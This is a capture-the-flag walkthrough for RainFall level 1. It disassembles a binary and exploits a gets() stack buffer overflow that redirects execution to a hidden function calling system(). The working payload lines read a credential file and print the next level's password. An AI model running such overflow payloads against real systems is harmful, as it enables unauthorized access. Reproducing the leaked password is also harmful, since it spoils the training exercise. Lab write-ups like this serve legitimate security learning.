# LEVEL 1

To this level, we will firstly take a look on functions inside our program with GDB.

```shell
level1@RainFall:~$ gdb -q level1
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
(gdb) i functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```

As we can see we have a unknown function ```run()``` let's see what's inside.

```shell
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.
```

The ```run()``` function call the ```system()``` function, we can easily understand that we will use this call to capture the level1 flag. But ```run()``` isn't call in ```main()```.

So to do this level i gonna use a vulnability of ```gets()``` to launch a **Buffer Overflow Attack** which means that we gonna overflow the buffer used by ```gets()``` and overwrite on the return address of ```main()```.

But to do this thing we need to know the buffer size. After many tests we've got this result :

```shell
level1@RainFall:~$ python -c 'print "\x90"*76' | ./level1
Illegal instruction (core dumped)
```
This means that our buffer is a size of 76. So we can fill our buffer with 76 characters then add our ```run()``` function address to change the main return address with ours.

```shell
level1@RainFall:~$ python -c 'print "\x90"*76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```
Perfect but the program closes right after the command, so we will add a echo print to ask the program what we want to do.

```shell
level1@RainFall:~$ (python -c 'print "\x90"*76 + "\x44\x84\x04\x08"'; echo "cat /home/user/level2/.pass") | ./level1
Good... Wait what?
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
Segmentation fault (core dumped)
```

